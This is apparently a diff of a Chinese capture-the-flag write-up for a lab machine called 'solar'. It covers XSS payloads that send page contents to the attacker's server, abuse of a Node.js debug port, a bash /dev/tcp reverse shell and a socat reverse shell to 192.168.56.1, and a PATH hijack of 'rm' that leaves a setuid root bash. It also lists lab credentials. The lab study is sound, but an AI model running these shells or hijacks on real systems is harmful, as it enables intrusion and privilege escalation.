@@ -1,3 +1,8 @@
+攻击链:
+
+![](images/d99b01320bff53e94d61acf2d9d7fa1eaee194d1.png)
+
+过程:
 
 ##### 开放了443的web服务
 
@@ -220,19 +225,19 @@ mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
 像这样 `btoa(encodeURIComponent(document.body.outerHTML))`
 
 - **`encodeURI(整段网址)`**：
-  
+
   - **用途**：编码整个 URL。
-  
+
   - **特点**：它**不会**编码 URL 里的特殊功能符号，比如 `http://` 里的 `://`，或者 `?`、`&`、`=`。
-  
+
   - **场景**：如果你要把一个完整的网址作为参数传给另一个网页。
 
 - **`encodeURIComponent(单独的参数值)`**：
-  
+
   - **用途**：编码 URL 里的某一个参数值（比如你要传的 HTML 源码或 Cookie）。
-  
+
   - **特点**：它**极其严格**，会把所有特殊字符（包括 `&`、`=`、`/`、`?`）全部编码（变成 `%26`、`%3D` 等）。
-  
+
   - **场景**：当你要把一大段包含特殊符号的文本（比如 HTML）塞进 `?data=` 后面时，**必须用这个**。如果不小心用了 `encodeURI`，HTML 源码里如果有个 `&` 符号，服务器就会以为这是另一个参数的分隔符，导致后面的数据全部截断丢失。
 
 ```javascript
@@ -340,11 +345,11 @@ mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
 
 #### 区别：
 
-|         | `new Image().src` | `location.href` |
-| ------- | ----------------- | --------------- |
-| 页面会不会跳走 | 不会，后台静默发请求        | 会，页面跳转到你的服务器    |
-| 混合内容限制  | 可能被拦              | 不受限制            |
-| 能不能收到数据 | 不确定               | 验证过能用           |
+|                | `new Image().src`    | `location.href`          |
+| -------------- | -------------------- | ------------------------ |
+| 页面会不会跳走 | 不会，后台静默发请求 | 会，页面跳转到你的服务器 |
+| 混合内容限制   | 可能被拦             | 不受限制                 |
+| 能不能收到数据 | 不确定               | 验证过能用               |
 
 如果你在意"页面不跳走、更隐蔽"，就用 `new Image().src`，先试试能不能收到数据；如果收
 
@@ -509,21 +514,21 @@ payload_html = '''<img src=x onerror="fetch('/records?download=true&file=2024-09
 ## 在现实中，这个系统通常由三个完全物理隔离的部分组成：
 
 1. **边缘设备（Edge Device）**：
-   
+
    - 这就是真正连接着太阳能板和电表的树莓派或 PLC。
-   
+
    - 它每隔 2 秒计算一次发电量，作为 MQTT 客户端（Publisher），把数据 `{"solarEnergy": 104...}` 发到云端 Broker 的 `data` 主题。
 
 2. **MQTT Broker（消息中枢）**：
-   
+
    - 部署在云端或机房，负责接收设备的数据，并广播给所有订阅者。
 
 3. **Web 服务器（前端 + 后端）**：
-   
+
    - **前端**：你的浏览器打开网页，连上 Broker 订阅 `data` 主题。图表动起来了。
-   
+
    - **后端（生成 PDF）**：管理员觉得当前图表很有价值，点击`send-record-id`对应按钮。前端把**当前的数据**和**当前图表的截图**打包，发给 Broker 的 `record` 主题。后端服务器订阅了 `record` 主题，收到数据后，调用 `wkhtmltopdf` 存入服务器硬盘。
-   
+
    - ![](images/2026-10-21-18-10-03-image.png)
 
 ## 在这台靶机里，全部塞到同一台机器里面了，理解业务逻辑有点困难
@@ -1580,13 +1585,14 @@ You just have to remember the one that starts with love and ends with a number
 
 ### 这个提权是真的难，其实可以一个内核漏洞脚本直接打穿的
 
-
 # Node.js 是一个让 JavaScript 能够在浏览器之外运行的运行时环境。
 
 ```bash
 julian     25890  3.4  3.9 1053772 79640 ?       Ssl  12:04   0:01 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
 ```
+
 # 这个julian运行了一个node.js,我们用doas kill来发送调试信号
+
 `permit lenam as julian cmd /bin/kill`
 
 ```
@@ -1598,4 +1604,132 @@ node 进程收到kill的 SIGUSR1
   → 以 julian 身份拿到 shell
 ```
 
+出现调试端口了
+![](images/Pasted%20image%2020261024123801.png)
 
+# 然后连接
+
+```bash
+/home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
+```
+
+# 进入后执行反弹shell
+
+```bash
+exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1\"')")
+```
+
+# 这个调试接口会很快关闭,所以要执行命令快一点
+
+![](images/Pasted%20image%2020261024125340.png)
+
+```
+permit setenv { PATH } julian as root cmd /usr/local/bin/backups
+```
+
+用这个来升级为root
+`setenv { PATH }` 表示：在为目标进程创建环境时，保留调用者现有的 `PATH` 值
+
+julian的密码从图片提取出来的,没太多实战意义,直接拿来用
+`tk8QaHUi3XaMLYoP1BpZ`
+
+ldd可以查看程序运行时依赖哪些动态共享库
+它只是提供依赖信息，但可以帮助你进一步判断：
+
+- 是否依赖非标准共享库。
+
+- 是否存在异常的库搜索路径或依赖。
+
+- 是否值得继续检查动态库加载机制。
+
+```bash
+ldd /usr/local/bin/backups
+```
+
+![](images/Pasted%20image%2020261024133422.png)
+
+`ldd` 主要查看程序运行时依赖的动态库；`readelf` 主要读取 ELF 文件本身的结构信息
+
+```bash
+readelf -d /usr/local/bin/backups
+```
+
+显示动态段
+动态段中常见的信息包括：
+
+- `NEEDED`：程序依赖的共享库。
+- `RPATH`和`RUNPATH`：指定的动态库搜索路径。
+  ![448](images/Pasted%20image%2020261024134428.png)
+
+# 用string可以看出`dlopen`、`dlsym`、`dlclose`,会加载动态库
+
+## 发现有个library加载错误,在`/var/www/sunfriends.nyx/database.sql.gz`下
+
+![](images/Pasted%20image%2020261024135742.png)
+
+![440](images/Pasted%20image%2020261024141746.png)解码出是个`libbackup.so`
+
+# 这个不是常见的系统动态库,应该是这个backups脚本自带的动态库,去看一下这个动态库
+
+![](images/Pasted%20image%2020261024142040.png)
+
+![](images/Pasted%20image%2020261024142233.png)
+发现所有人可读
+![](images/Pasted%20image%2020261024142409.png)
+
+`rm`是相对路径,可以PATH Hijack了
+
+在/tmp写个反弹shell命名为rm,需要给x权限
+
+```bash
+socat TCP:192.168.56.1:2222 EXEC:'bash',pty,stderr,setsid,sigint,sane
+```
+
+监听
+
+```bash
+socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:2222
+```
+
+这样弹回来的shell只是用不了rm这个命令,可以按作者那样写脚本,将root的/bin/bash复制到/tmp/bash 然后就可以进入root的shell了
+
+```
+julian@solar:~$ nano .local/bin/rm
+
+julian@solar:~$ cat .local/bin/rm
+#!/bin/bash
+
+cp /bin/bash /tmp/
+chmod u+s /tmp/bash
+
+julian@solar:~$ chmod +x .local/bin/rm
+```
+
+```
+julian@solar:/tmp$ doas /usr/local/bin/backups nio
+doas (julian@solar) password:
+mysqldump: Got error: 1049: "Unknown database 'nio'" when selecting the database
+Error executing mysqldump and gzip. Exit code: 512
+```
+
+我们需要找一个存在的数据库名字,
+![](images/Pasted%20image%2020261024145450.png)
+
+这是数据库备份文件,预览查看里面的数据库名字
+
+```
+gzip -dc /var/www/sunfriends.nyx/database.sql.gz
+```
+
+![](images/Pasted%20image%2020261024150028.png)
+
+![](images/Pasted%20image%2020261024150232.png)
+
+# 终于结束了,闹麻了
+
+程序运行动态库或PATH劫持方法:
+
+- 静态分析： `file`、`strings`、`readelf` 用于寻找文件类型、字符串、动态依赖等线索。
+- 运行时分析： 如果程序会动态加载库，使用适当的跟踪工具观察实际加载行为。
+- 调用链分析： 检查共享库如何执行外部命令，尤其关注 `system()`、命令拼接和未使用绝对路径的命令。
+- 权限链验证： 判断普通用户是否能控制被执行的文件，以及该文件最终会以什么权限运行。
